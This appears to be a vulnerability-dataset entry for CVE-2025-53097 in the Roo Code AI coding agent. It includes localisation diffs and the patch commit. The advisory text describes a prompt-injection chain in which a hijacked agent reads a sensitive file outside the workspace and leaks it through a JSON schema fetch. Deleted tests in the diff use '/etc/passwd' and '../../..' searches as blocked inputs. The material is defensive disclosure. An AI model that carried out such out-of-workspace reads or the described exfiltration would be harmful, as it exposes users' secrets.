 		"wantsToEditOutsideWorkspace": "Roo vol editar aquest fitxer fora de l'espai de treball:",
+		"wantsToEditProtected": "Roo vol editar un fitxer de configuració protegit:",
 		"wantsToCreate": "Roo vol crear un nou fitxer:",
 		"wantsToSearchReplace": "Roo vol realitzar cerca i substitució en aquest fitxer:",
 		"didSearchReplace": "Roo ha realitzat cerca i substitució en aquest fitxer:",
diff --git a/webview-ui/src/i18n/locales/ca/settings.json b/webview-ui/src/i18n/locales/ca/settings.json
index edadf729ed76..205ff89e3aa8 100644
--- a/webview-ui/src/i18n/locales/ca/settings.json
+++ b/webview-ui/src/i18n/locales/ca/settings.json
@@ -83,6 +83,10 @@
 			"outsideWorkspace": {
 				"label": "Incloure fitxers fora de l'espai de treball",
 				"description": "Permetre a Roo crear i editar fitxers fora de l'espai de treball actual sense requerir aprovació."
+			},
+			"protected": {
+				"label": "Incloure fitxers protegits",
+				"description": "Permetre a Roo crear i editar fitxers protegits (com .rooignore i fitxers de configuració .roo/) sense requerir aprovació."
 			}
 		},
 		"browser": {
diff --git a/webview-ui/src/i18n/locales/de/chat.json b/webview-ui/src/i18n/locales/de/chat.json
index 451cea47d3c6..764073e17ca6 100644
--- a/webview-ui/src/i18n/locales/de/chat.json
+++ b/webview-ui/src/i18n/locales/de/chat.json
@@ -146,6 +146,7 @@
 		"didRead": "Roo hat diese Datei gelesen:",
 		"wantsToEdit": "Roo möchte diese Datei bearbeiten:",
 		"wantsToEditOutsideWorkspace": "Roo möchte diese Datei außerhalb des Arbeitsbereichs bearbeiten:",
+		"wantsToEditProtected": "Roo möchte eine geschützte Konfigurationsdatei bearbeiten:",
 		"wantsToCreate": "Roo möchte eine neue Datei erstellen:",
 		"wantsToSearchReplace": "Roo möchte in dieser Datei suchen und ersetzen:",
 		"didSearchReplace": "Roo hat Suchen und Ersetzen in dieser Datei durchgeführt:",
diff --git a/webview-ui/src/i18n/locales/de/settings.json b/webview-ui/src/i18n/locales/de/settings.json
index 6597d8f71750..044c4f522098 100644
--- a/webview-ui/src/i18n/locales/de/settings.json
+++ b/webview-ui/src/i18n/locales/de/settings.json
@@ -83,6 +83,10 @@
 			"outsideWorkspace": {
 				"label": "Dateien außerhalb des Arbeitsbereichs einbeziehen",
 				"description": "Roo erlauben, Dateien außerhalb des aktuellen Arbeitsbereichs ohne Genehmigung zu erstellen und zu bearbeiten."
+			},
+			"protected": {
+				"label": "Geschützte Dateien einbeziehen",
+				"description": "Roo erlauben, geschützte Dateien (wie .rooignore und .roo/ Konfigurationsdateien) ohne Genehmigung zu erstellen und zu bearbeiten."
 			}
 		},
 		"browser": {
diff --git a/webview-ui/src/i18n/locales/en/chat.json b/webview-ui/src/i18n/locales/en/chat.json
index 34236c56363c..f5d741ff4b64 100644
--- a/webview-ui/src/i18n/locales/en/chat.json
+++ b/webview-ui/src/i18n/locales/en/chat.json
@@ -156,6 +156,7 @@
 		"didRead": "Roo read this file:",
 		"wantsToEdit": "Roo wants to edit this file:",
 		"wantsToEditOutsideWorkspace": "Roo wants to edit this file outside of the workspace:",
+		"wantsToEditProtected": "Roo wants to edit a protected configuration file:",
 		"wantsToApplyBatchChanges": "Roo wants to apply changes to multiple files:",
 		"wantsToCreate": "Roo wants to create a new file:",
 		"wantsToSearchReplace": "Roo wants to search and replace in this file:",
diff --git a/webview-ui/src/i18n/locales/en/settings.json b/webview-ui/src/i18n/locales/en/settings.json
index d1c30270cf98..b7f2a014c964 100644
--- a/webview-ui/src/i18n/locales/en/settings.json
+++ b/webview-ui/src/i18n/locales/en/settings.json
@@ -83,6 +83,10 @@
 			"outsideWorkspace": {
 				"label": "Include files outside workspace",
 				"description": "Allow Roo to create and edit files outside the current workspace without requiring approval."
+			},
+			"protected": {
+				"label": "Include protected files",
+				"description": "Allow Roo to create and edit protected files (like .rooignore and .roo/ configuration files) without requiring approval."
 			}
 		},
 		"browser": {
diff --git a/webview-ui/src/i18n/locales/es/chat.json b/webview-ui/src/i18n/locales/es/chat.json
index dc0a49332f2e..2bd8eac84bc7 100644
--- a/webview-ui/src/i18n/locales/es/chat.json
+++ b/webview-ui/src/i18n/locales/es/chat.json
@@ -145,6 +145,7 @@
 		"didRead": "Roo leyó este archivo:",
 		"wantsToEdit": "Roo quiere editar este archivo:",
 		"wantsToEditOutsideWorkspace": "Roo quiere editar este archivo fuera del espacio de trabajo:",
+		"wantsToEditProtected": "Roo quiere editar un archivo de configuración protegido:",
 		"wantsToCreate": "Roo quiere crear un nuevo archivo:",
 		"wantsToSearchReplace": "Roo quiere realizar búsqueda y reemplazo en este archivo:",
 		"didSearchReplace": "Roo realizó búsqueda y reemplazo en este archivo:",
diff --git a/webview-ui/src/i18n/locales/es/settings.json b/webview-ui/src/i18n/locales/es/settings.json
index c9a356e4cd1a..b9d0d25ec39f 100644
--- a/webview-ui/src/i18n/locales/es/settings.json
+++ b/webview-ui/src/i18n/locales/es/settings.json
@@ -83,6 +83,10 @@
 			"outsideWorkspace": {
 				"label": "Incluir archivos fuera del espacio de trabajo",
 				"description": "Permitir a Roo crear y editar archivos fuera del espacio de trabajo actual sin requerir aprobación."
+			},
+			"protected": {
+				"label": "Incluir archivos protegidos",
+				"description": "Permitir a Roo crear y editar archivos protegidos (como .rooignore y archivos de configuración .roo/) sin requerir aprobación."
 			}
 		},
 		"browser": {
diff --git a/webview-ui/src/i18n/locales/fr/chat.json b/webview-ui/src/i18n/locales/fr/chat.json
index 4a7d298fbf08..b864c7b133d2 100644
--- a/webview-ui/src/i18n/locales/fr/chat.json
+++ b/webview-ui/src/i18n/locales/fr/chat.json
@@ -142,6 +142,7 @@
 		"didRead": "Roo a lu ce fichier :",
 		"wantsToEdit": "Roo veut éditer ce fichier :",
 		"wantsToEditOutsideWorkspace": "Roo veut éditer ce fichier en dehors de l'espace de travail :",
+		"wantsToEditProtected": "Roo veut éditer un fichier de configuration protégé :",
 		"wantsToCreate": "Roo veut créer un nouveau fichier :",
 		"wantsToSearchReplace": "Roo veut effectuer une recherche et remplacement sur ce fichier :",
 		"didSearchReplace": "Roo a effectué une recherche et remplacement sur ce fichier :",
diff --git a/webview-ui/src/i18n/locales/fr/settings.json b/webview-ui/src/i18n/locales/fr/settings.json
index 430c8793961d..87cc5c7a0a8b 100644
--- a/webview-ui/src/i18n/locales/fr/settings.json
+++ b/webview-ui/src/i18n/locales/fr/settings.json
@@ -83,6 +83,10 @@
 			"outsideWorkspace": {
 				"label": "Inclure les fichiers en dehors de l'espace de travail",
 				"description": "Permettre à Roo de créer et modifier des fichiers en dehors de l'espace de travail actuel sans nécessiter d'approbation."
+			},
+			"protected": {
+				"label": "Inclure les fichiers protégés",
+				"description": "Permettre à Roo de créer et modifier des fichiers protégés (comme .rooignore et les fichiers de configuration .roo/) sans nécessiter d'approbation."
 			}
 		},
 		"browser": {
diff --git a/webview-ui/src/i18n/locales/hi/chat.json b/webview-ui/src/i18n/locales/hi/chat.json
index c4f7a322bf8f..375aa0d6a2e7 100644
--- a/webview-ui/src/i18n/locales/hi/chat.json
+++ b/webview-ui/src/i18n/locales/hi/chat.json
@@ -145,6 +145,7 @@
 		"didRead": "Roo ने इस फ़ाइल को पढ़ा:",
 		"wantsToEdit": "Roo इस फ़ाइल को संपादित करना चाहता है:",
 		"wantsToEditOutsideWorkspace": "Roo कार्यक्षेत्र के बाहर इस फ़ाइल को संपादित करना चाहता है:",
+		"wantsToEditProtected": "Roo एक सुरक्षित कॉन्फ़िगरेशन फ़ाइल को संपादित करना चाहता है:",
 		"wantsToCreate": "Roo एक नई फ़ाइल बनाना चाहता है:",
 		"wantsToSearchReplace": "Roo इस फ़ाइल में खोज और प्रतिस्थापन करना चाहता है:",
 		"didSearchReplace": "Roo ने इस फ़ाइल में खोज और प्रतिस्थापन किया:",
diff --git a/webview-ui/src/i18n/locales/hi/settings.json b/webview-ui/src/i18n/locales/hi/settings.json
index 31ab2191d5cb..86afe5931921 100644
--- a/webview-ui/src/i18n/locales/hi/settings.json
+++ b/webview-ui/src/i18n/locales/hi/settings.json
@@ -83,6 +83,10 @@
 			"outsideWorkspace": {
 				"label": "वर्कस्पेस के बाहर की फाइलें शामिल करें",
 				"description": "Roo को अनुमोदन की आवश्यकता के बिना वर्तमान वर्कस्पेस के बाहर फाइलें बनाने और संपादित करने की अनुमति दें।"
+			},
+			"protected": {
+				"label": "संरक्षित फाइलें शामिल करें",
+				"description": "Roo को अनुमोदन की आवश्यकता के बिना संरक्षित फाइलें (.rooignore और .roo/ कॉन्फ़िगरेशन फाइलें जैसी) बनाने और संपादित करने की अनुमति दें।"
 			}
 		},
 		"browser": {
diff --git a/webview-ui/src/i18n/locales/it/chat.json b/webview-ui/src/i18n/locales/it/chat.json
index 4dd56661343b..93d1526540bb 100644
--- a/webview-ui/src/i18n/locales/it/chat.json
+++ b/webview-ui/src/i18n/locales/it/chat.json
@@ -145,6 +145,7 @@
 		"didRead": "Roo ha letto questo file:",
 		"wantsToEdit": "Roo vuole modificare questo file:",
 		"wantsToEditOutsideWorkspace": "Roo vuole modificare questo file al di fuori dell'area di lavoro:",
+		"wantsToEditProtected": "Roo vuole modificare un file di configurazione protetto:",
 		"wantsToCreate": "Roo vuole creare un nuovo file:",
 		"wantsToSearchReplace": "Roo vuole eseguire ricerca e sostituzione in questo file:",
 		"didSearchReplace": "Roo ha eseguito ricerca e sostituzione in questo file:",
diff --git a/
... [truncated]

================================================================================


CVE ID: CVE-2025-53097
Published: 2025-06-27T22:15:25.803
Modified: 2025-09-15T13:47:38.837
CVSS Score: 5.9 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-74: CWE-74

Description:
Roo Code is an AI-powered autonomous coding agent. Prior to version 3.20.3, there was an issue where the Roo Code agent's `search_files` tool did not respect the setting to disable reads outside of the VS Code workspace. This means that an attacker who was able to inject a prompt into the agent could potentially read a sensitive file and then write the information to a JSON schema. Users have the option to disable schema fetching in VS Code, but the feature is enabled by default. For users with this feature enabled, writing to the schema would trigger a network request without the user having a chance to deny. This issue is of moderate severity, since it requires the attacker to already be able to submit prompts to the agent. Version 3.20.3 fixed the issue where `search_files` did not respect the setting to limit it to the workspace. This reduces the scope of the damage if an attacker is able to take control of the agent through prompt injection or another vector.

References (3):
  1. https://github.com/RooCodeInc/Roo-Code/commit/10b2fb32ed047bbd7b8d10ef185c1ed345efcc92 [Patch]
  2. https://github.com/RooCodeInc/Roo-Code/commit/7d0b22f9e659dc6c26aab0bacbea27874986e772 [Patch]
  3. https://github.com/RooCodeInc/Roo-Code/security/advisories/GHSA-wr2q-46pg-f228 [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/RooCodeInc/Roo-Code/commit/10b2fb32ed047bbd7b8d10ef185c1ed345efcc92 ---
From 10b2fb32ed047bbd7b8d10ef185c1ed345efcc92 Mon Sep 17 00:00:00 2001
From: Matt Rubens <mrubens@users.noreply.github.com>
Date: Fri, 13 Jun 2025 18:49:39 -0400
Subject: [PATCH] =?UTF-8?q?Adjust=20searching=20outside=20of=20the=20works?=
 =?UTF-8?q?pace=20to=20respect=20the=20auto-approve=E2=80=A6=20(#4670)?=
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Adjust searching outside of the workspace to respect the auto-approve checkbox
---
 .../tools/__tests__/searchFilesTool.spec.ts   | 300 ------------------
 src/core/tools/searchFilesTool.ts             |  18 +-
 src/i18n/locales/ca/tools.json                |   3 -
 src/i18n/locales/de/tools.json                |   3 -
 src/i18n/locales/en/tools.json                |   3 -
 src/i18n/locales/es/tools.json                |   3 -
 src/i18n/locales/fr/tools.json                |   3 -
 src/i18n/locales/hi/tools.json                |   3 -
 src/i18n/locales/it/tools.json                |   3 -
 src/i18n/locales/ja/tools.json                |   3 -
 src/i18n/locales/ko/tools.json                |   3 -
 src/i18n/locales/nl/tools.json                |   3 -
 src/i18n/locales/pl/tools.json                |   3 -
 src/i18n/locales/pt-BR/tools.json             |   3 -
 src/i18n/locales/ru/tools.json                |   3 -
 src/i18n/locales/tr/tools.json                |   3 -
 src/i18n/locales/vi/tools.json                |   3 -
 src/i18n/locales/zh-CN/tools.json             |   3 -
 src/i18n/locales/zh-TW/tools.json             |   3 -
 webview-ui/src/components/chat/ChatRow.tsx    |  12 +-
 webview-ui/src/i18n/locales/ca/chat.json      |   4 +-
 webview-ui/src/i18n/locales/de/chat.json      |   4 +-
 webview-ui/src/i18n/locales/en/chat.json      |   4 +-
 webview-ui/src/i18n/locales/es/chat.json      |   4 +-
 webview-ui/src/i18n/locales/fr/chat.json      |   4 +-
 webview-ui/src/i18n/locales/hi/chat.json      |   4 +-
 webview-ui/src/i18n/locales/it/chat.json      |   4 +-
 webview-ui/src/i18n/locales/ja/chat.json      |   4 +-
 webview-ui/src/i18n/locales/ko/chat.json      |   4 +-
 webview-ui/src/i18n/locales/nl/chat.json      |   4 +-
 webview-ui/src/i18n/locales/pl/chat.json      |   4 +-
 webview-ui/src/i18n/locales/pt-BR/chat.json   |   4 +-
 webview-ui/src/i18n/locales/ru/chat.json      |   4 +-
 webview-ui/src/i18n/locales/tr/chat.json      |   4 +-
 webview-ui/src/i18n/locales/vi/chat.json      |   4 +-
 webview-ui/src/i18n/locales/zh-CN/chat.json   |   4 +-
 webview-ui/src/i18n/locales/zh-TW/chat.json   |   4 +-
 37 files changed, 65 insertions(+), 384 deletions(-)
 delete mode 100644 src/core/tools/__tests__/searchFilesTool.spec.ts

diff --git a/src/core/tools/__tests__/searchFilesTool.spec.ts b/src/core/tools/__tests__/searchFilesTool.spec.ts
deleted file mode 100644
index 7d194572085e..000000000000
--- a/src/core/tools/__tests__/searchFilesTool.spec.ts
+++ /dev/null
@@ -1,300 +0,0 @@
-import path from "path"
-import { describe, it, expect, beforeEach, vi, type Mock, type MockedFunction } from "vitest"
-import { searchFilesTool } from "../searchFilesTool"
-import { Task } from "../../task/Task"
-import { SearchFilesToolUse } from "../../../shared/tools"
-import { isPathOutsideWorkspace } from "../../../utils/pathUtils"
-import { regexSearchFiles } from "../../../services/ripgrep"
-import { RooIgnoreController } from "../../ignore/RooIgnoreController"
-
-// Mock dependencies
-vi.mock("../../../utils/pathUtils", () => ({
-	isPathOutsideWorkspace: vi.fn(),
-}))
-
-vi.mock("../../../services/ripgrep", () => ({
-	regexSearchFiles: vi.fn(),
-}))
-
-vi.mock("../../../utils/path", () => ({
-	getReadablePath: vi.fn((cwd: string, relPath: string) => relPath),
-}))
-
-vi.mock("../../ignore/RooIgnoreController")
-
-vi.mock("../../../i18n", () => ({
-	t: vi.fn((key: string, params?: any) => {
-		if (key === "tools:searchFiles.workspaceBoundaryError") {
-			return `Cannot search outside workspace. Path '${params?.path}' is outside the current workspace.`
-		}
-		return key
-	}),
-}))
-
-const mockedIsPathOutsideWorkspace = isPathOutsideWorkspace as MockedFunction<typeof isPathOutsideWorkspace>
-const mockedRegexSearchFiles = regexSearchFiles as MockedFunction<typeof regexSearchFiles>
-
-describe("searchFilesTool", () => {
-	let mockTask: Partial<Task>
-	let mockAskApproval: Mock
-	let mockHandleError: Mock
-	let mockPushToolResult: Mock
-	let mockRemoveClosingTag: Mock
-
-	beforeEach(() => {
-		vi.clearAllMocks()
-
-		mockTask = {
-			cwd: "/workspace",
-			consecutiveMistakeCount: 0,
-			recordToolError: vi.fn(),
-			sayAndCreateMissingParamError: vi.fn().mockResolvedValue("Missing parameter error"),
-			say: vi.fn().mockResolvedValue(undefined),
-			rooIgnoreController: new RooIgnoreController("/workspace"),
-		}
-
-		mockAskApproval = vi.fn().mockResolvedValue(true)
-		mockHandleError = vi.fn()
-		mockPushToolResult = vi.fn()
-		mockRemoveClosingTag = vi.fn((tag: string, value: string | undefined) => value || "")
-
-		mockedRegexSearchFiles.mockResolvedValue("Search results")
-	})
-
-	describe("workspace boundary validation", () => {
-		it("should allow search within workspace", async () => {
-			const block: SearchFilesToolUse = {
-				type: "tool_use",
-				name: "search_files",
-				params: {
-					path: "src",
-					regex: "test",
-					file_pattern: "*.ts",
-				},
-				partial: false,
-			}
-
-			mockedIsPathOutsideWorkspace.mockReturnValue(false)
-
-			await searchFilesTool(
-				mockTask as Task,
-				block,
-				mockAskApproval,
-				mockHandleError,
-				mockPushToolResult,
-				mockRemoveClosingTag,
-			)
-
-			expect(mockedIsPathOutsideWorkspace).toHaveBeenCalledWith(path.resolve("/workspace", "src"))
-			expect(mockedRegexSearchFiles).toHaveBeenCalled()
-			expect(mockPushToolResult).toHaveBeenCalledWith("Search results")
-		})
-
-		it("should block search outside workspace", async () => {
-			const block: SearchFilesToolUse = {
-				type: "tool_use",
-				name: "search_files",
-				params: {
-					path: "../external",
-					regex: "test",
-					file_pattern: "*.ts",
-				},
-				partial: false,
-			}
-
-			mockedIsPathOutsideWorkspace.mockReturnValue(true)
-
-			await searchFilesTool(
-				mockTask as Task,
-				block,
-				mockAskApproval,
-				mockHandleError,
-				mockPushToolResult,
-				mockRemoveClosingTag,
-			)
-
-			expect(mockedIsPathOutsideWorkspace).toHaveBeenCalledWith(path.resolve("/workspace", "../external"))
-			expect(mockedRegexSearchFiles).not.toHaveBeenCalled()
-			expect(mockTask.say).toHaveBeenCalledWith(
-				"error",
-				"Cannot search outside workspace. Path '../external' is outside the current workspace.",
-			)
-			expect(mockPushToolResult).toHaveBeenCalledWith(
-				"Cannot search outside workspace. Path '../external' is outside the current workspace.",
-			)
-			expect(mockTask.consecutiveMistakeCount).toBe(1)
-			expect(mockTask.recordToolError).toHaveBeenCalledWith("search_files")
-		})
-
-		it("should block search with absolute path outside workspace", async () => {
-			const block: SearchFilesToolUse = {
-				type: "tool_use",
-				name: "search_files",
-				params: {
-					path: "/etc/passwd",
-					regex: "root",
-				},
-				partial: false,
-			}
-
-			mockedIsPathOutsideWorkspace.mockReturnValue(true)
-
-			await searchFilesTool(
-				mockTask as Task,
-				block,
-				mockAskApproval,
-				mockHandleError,
-				mockPushToolResult,
-				mockRemoveClosingTag,
-			)
-
-			expect(mockedIsPathOutsideWorkspace).toHaveBeenCalledWith(path.resolve("/workspace", "/etc/passwd"))
-			expect(mockedRegexSearchFiles).not.toHaveBeenCalled()
-			expect(mockTask.say).toHaveBeenCalledWith(
-				"error",
-				"Cannot search outside workspace. Path '/etc/passwd' is outside the current workspace.",
-			)
-			expect(mockPushToolResult).toHaveBeenCalledWith(
-				"Cannot search outside workspace. Path '/etc/passwd' is outside the current workspace.",
-			)
-		})
-
-		it("should handle relative paths that resolve outside workspace", async () => {
-			const block: SearchFilesToolUse = {
-				type: "tool_use",
-				name: "search_files",
-				params: {
-					path: "../../..",
-					regex: "sensitive",
-				},
-				partial: false,
-			}
-
-			mockedIsPathOutsideWorkspace.mockReturnValue(true)
-
-			await searchFilesTool(
-				mockTask as Task,
-				block,
-				mockAskApproval,
-				mockHandleError,
-				mockPushToolResult,
-				mockRemoveClosingTag,
-			)
-
-			expect(mockedIsPathOutsideWorkspace).toHaveBeenCalledWith(path.resolve("/workspace", "../../.."))
-			expect(mockedRegexSearchFiles).not.toHaveBeenCalled()
-			expect(mockTask.say).toHaveBeenCalledWith(
-				"error",
-				"Cannot search outside workspace. Path '../../..' is outside the current workspace.",
-			)
-			expect(mockPushToolResult).toHaveBeenCalledWith(
-				"Cannot search outside workspace. Path '../../..' is outside the current workspace.",
-			)
-		})
-	})
-
-	describe("existing functionality", () => {
-		beforeEach(() => {
-			mockedIsPathOutsideWorkspace.mockReturnValue(false)
-		})
-
-		it("should handle missing path parameter", async () => {
-			const block: SearchFilesToolUse = {
-				type: "tool_use",
-				name: "search_files",
-				params: {
-					regex: "test",
-				},
-				partial: false,
-			}
-
-			await searchFilesTool(
-				mockTask as Task,
-				block,
-				mockAskApproval,
-				mockHandleError,
-				mockPushToolResult,
-				mockRemoveClosingTag,
-			)
-
-			expect(mockTask.sayAndCreateMissingParamError).toHaveBeenCalledWith("search_files", "path")
-			expect(mockedRegexSearchFiles).not.toHaveBeenCalled()
-		})
-
-		it("should handle missing regex parameter", async () => {
-			const block: SearchFilesToolUse = {
-				type: "tool_use",
-				name: "search_files",
-				params: {
-					path: "src",
-				},
-				partial: false,
-			}
-
-			await searchFilesTool(
-				mockTask as Task,
-				block,
-				mockAskApproval,
-				mockHandleError,
-				mockPushToolResult,
-				mockRemoveClosingTag,
-			)
-
-			expect(mockTask.sayAndCreateMissingParamError).toHaveBeenCalledWith("search_files", "regex")
-			expect(mockedRegexSearchFiles).not.toHaveBeenCalled()
-		})
-
-		it("should handle partial blocks", async () => {
-			const block: SearchFilesToolUse = {
-				type: "tool_use",
-				name: "search_files",
-				params: {
-					path: "src",
-					regex: "test",
-				},
-				partial: true,
-			}
-
-			const mockAsk = vi.fn()
-			mockTask.ask = mockAsk
-
-			await searchFilesTool(
-				mockTask as Task,
-				block,
-				mockAskApproval,
-				mockHandleError,
-				mockPushToolResult,
-				mockRemoveClosingTag,
-			)
-
-			expect(mockAsk).toHaveBeenCalled()
-			expect(mockedRegexSearchFiles).not.toHaveBeenCalled()
-		})
-
-		it("should handle user rejection", async () => {
-			const block: SearchFilesToolUse = {
-				type: "tool_use",
-				name: "search_files",
-				params: {
-					path: "src",
-					regex: "test",
-				},
-				partial: false,
-			}
-
-			mockAskApproval.mockResolvedValue(false)
-
-			await searchFilesTool(
-				mockTask as Task,
-				block,
-				mockAskApproval,
-				mockHandleError,
-				mockPushToolResult,
-				mockRemoveClosingTag,
-			)
-
-			expect(mockedRegexSearchFiles).toHaveBeenCalled()
-			expect(mockPushToolResult).not.toHaveBeenCalled()
-		})
-	})
-})
diff --git a/src/core/tools/searchFilesTool.ts b/src/core/tools/searchFilesTool.ts
index c006b3b3a91a..b6ee97f87426 100644
--- a/src/core/tools/searchFilesTool.ts
+++ b/src/core/tools/searchFilesTool.ts
@@ -6,7 +6,6 @@ import { ClineSayTool } from "../../shared/ExtensionMessage"
 import { getReadablePath } from "../../utils/path"
 import { isPathOutsideWorkspace } from "../../utils/pathUtils"
 import { regexSearchFiles } from "../../services/ripgrep"
-import { t } from "../../i18n"
 
 export async function searchFilesTool(
 	cline: Task,
@@ -20,11 +19,15 @@ export async function searchFilesTool(
 	const regex: string | undefined = block.params.regex
 	const filePattern: string | undefined = block.params.file_pattern
 
+	const absolutePath = relDirPath ? path.resolve(cline.cwd, relDirPath) : cline.cwd
+	const isOutsideWorkspace = isPathOutsideWorkspace(absolutePath)
+
 	const sharedMessageProps: ClineSayTool = {
 		tool: "searchFiles",
 		path: getReadablePath(cline.cwd, removeClosingTag("path", relDirPath)),
 		regex: removeClosingTag("regex", regex),
 		filePattern: removeClosingTag("file_pattern", filePattern),
+		isOutsideWorkspace,
 	}
 
 	try {
@@ -49,19 +52,6 @@ export async function searchFilesTool(
 
 			cline.consecutiveMistakeCount = 0
 
-			const absolutePath = path.resolve(cline.cwd, relDirPath)
-
-			// Check if path is outside workspace
-			if (isPathOutsideWorkspace(absolutePath)) {
-				const userErrorMessage = t("tools:searchFiles.workspaceBoundaryError", { path: relDirPath })
-				const llmErrorMessage = `Cannot search outside workspace. Path '${relDirPath}' is outside the current workspace.`
-				cline.consecutiveMistakeCount++
-				cline.recordToolError("search_files")
-				await cline.say("error", userErrorMessage)
-				pushToolResult(llmErrorMessage)
-				return
-			}
-
 			const results = await regexSearchFiles(
 				cline.cwd,
 				absolutePath,
diff --git a/src/i18n/locales/ca/tools.json b/src/i18n/locales/ca/tools.json
index ba42ca420d69..0fe673310f4c 100644
--- a/src/i18n/locales/ca/tools.json
+++ b/src/i18n/locales/ca/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo sembla estar atrapat en un bucle, intentant la mateixa acció ({{toolName}}) repetidament. Això podria indicar un problema amb la seva estratègia actual. Considera reformular la tasca, proporcionar instruccions més específiques o guiar-lo cap a un enfocament diferent.",
 	"codebaseSearch": {
 		"approval": "Cercant '{{query}}' a la base de codi..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "No es pot cercar fora de l'espai de treball. El camí '{{path}}' està fora de l'espai de treball actual."
 	}
 }
diff --git a/src/i18n/locales/de/tools.json b/src/i18n/locales/de/tools.json
index 64dd24b53dee..03c491c115d7 100644
--- a/src/i18n/locales/de/tools.json
+++ b/src/i18n/locales/de/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo scheint in einer Schleife festzustecken und versucht wiederholt dieselbe Aktion ({{toolName}}). Dies könnte auf ein Problem mit der aktuellen Strategie hindeuten. Überlege dir, die Aufgabe umzuformulieren, genauere Anweisungen zu geben oder Roo zu einem anderen Ansatz zu führen.",
 	"codebaseSearch": {
 		"approval": "Suche nach '{{query}}' im Codebase..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "Kann nicht außerhalb des Arbeitsbereichs suchen. Pfad '{{path}}' liegt außerhalb des aktuellen Arbeitsbereichs."
 	}
 }
diff --git a/src/i18n/locales/en/tools.json b/src/i18n/locales/en/tools.json
index bb298a32e6c5..9932fc4d0647 100644
--- a/src/i18n/locales/en/tools.json
+++ b/src/i18n/locales/en/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo appears to be stuck in a loop, attempting the same action ({{toolName}}) repeatedly. This might indicate a problem with its current strategy. Consider rephrasing the task, providing more specific instructions, or guiding it towards a different approach.",
 	"codebaseSearch": {
 		"approval": "Searching for '{{query}}' in codebase..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "Cannot search outside workspace. Path '{{path}}' is outside the current workspace."
 	}
 }
diff --git a/src/i18n/locales/es/tools.json b/src/i18n/locales/es/tools.json
index 14683a3a1e89..0dbba751b7ac 100644
--- a/src/i18n/locales/es/tools.json
+++ b/src/i18n/locales/es/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo parece estar atrapado en un bucle, intentando la misma acción ({{toolName}}) repetidamente. Esto podría indicar un problema con su estrategia actual. Considera reformular la tarea, proporcionar instrucciones más específicas o guiarlo hacia un enfoque diferente.",
 	"codebaseSearch": {
 		"approval": "Buscando '{{query}}' en la base de código..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "No se puede buscar fuera del espacio de trabajo. La ruta '{{path}}' está fuera del espacio de trabajo actual."
 	}
 }
diff --git a/src/i18n/locales/fr/tools.json b/src/i18n/locales/fr/tools.json
index d700abbf5e66..bdf26fb3cb2e 100644
--- a/src/i18n/locales/fr/tools.json
+++ b/src/i18n/locales/fr/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo semble être bloqué dans une boucle, tentant la même action ({{toolName}}) de façon répétée. Cela pourrait indiquer un problème avec sa stratégie actuelle. Envisage de reformuler la tâche, de fournir des instructions plus spécifiques ou de le guider vers une approche différente.",
 	"codebaseSearch": {
 		"approval": "Recherche de '{{query}}' dans la base de code..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "Impossible de rechercher en dehors de l'espace de travail. Le chemin '{{path}}' est en dehors de l'espace de travail actuel."
 	}
 }
diff --git a/src/i18n/locales/hi/tools.json b/src/i18n/locales/hi/tools.json
index 898545136598..257fc8a531c2 100644
--- a/src/i18n/locales/hi/tools.json
+++ b/src/i18n/locales/hi/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo एक लूप में फंसा हुआ लगता है, बार-बार एक ही क्रिया ({{toolName}}) को दोहरा रहा है। यह उसकी वर्तमान रणनीति में किसी समस्या का संकेत हो सकता है। कार्य को पुनः परिभाषित करने, अधिक विशिष्ट निर्देश देने, या उसे एक अलग दृष्टिकोण की ओर मार्गदर्शित करने पर विचार करें।",
 	"codebaseSearch": {
 		"approval": "कोडबेस में '{{query}}' खोज रहा है..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "वर्कस्पेस के बाहर खोज नहीं की जा सकती। पथ '{{path}}' वर्तमान वर्कस्पेस के बाहर है।"
 	}
 }
diff --git a/src/i18n/locales/it/tools.json b/src/i18n/locales/it/tools.json
index 8ccca383e52d..0dc14f94a503 100644
--- a/src/i18n/locales/it/tools.json
+++ b/src/i18n/locales/it/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Roo sembra essere bloccato in un ciclo, tentando ripetutamente la stessa azione ({{toolName}}). Questo potrebbe indicare un problema con la sua strategia attuale. Considera di riformulare l'attività, fornire istruzioni più specifiche o guidarlo verso un approccio diverso.",
 	"codebaseSearch": {
 		"approval": "Ricerca di '{{query}}' nella base di codice..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "Impossibile cercare al di fuori dell'area di lavoro. Il percorso '{{path}}' è al di fuori dell'area di lavoro corrente."
 	}
 }
diff --git a/src/i18n/locales/ja/tools.json b/src/i18n/locales/ja/tools.json
index 2cce55b41c82..ad6b7019c88d 100644
--- a/src/i18n/locales/ja/tools.json
+++ b/src/i18n/locales/ja/tools.json
@@ -7,8 +7,5 @@
 	"toolRepetitionLimitReached": "Rooが同じ操作（{{toolName}}）を繰り返し試みるループに陥っているようです。これは現在の方法に問題がある可能性を示しています。タスクの言い換え、より具体的な指示の提供、または別のアプローチへの誘導を検討してください。",
 	"codebaseSearch": {
 		"approval": "コードベースで '{{query}}' を検索中..."
-	},
-	"searchFiles": {
-		"workspaceBoundaryError": "ワークスペース外では検索できません。パス '{{path}}' は現在のワークスペース外にあります。"
 	}
 }
diff --git a/src/i18n/locales/ko/tools.json b/src/i18n/locales/ko/tools.json
index 80a3974fbc99..c8c8deebec8a 100644
--- a/src/i18n/locales/ko/tools.json
+++ b/src/i18n/locales/ko/tools.json
@@ -7,8 +7,5 @@
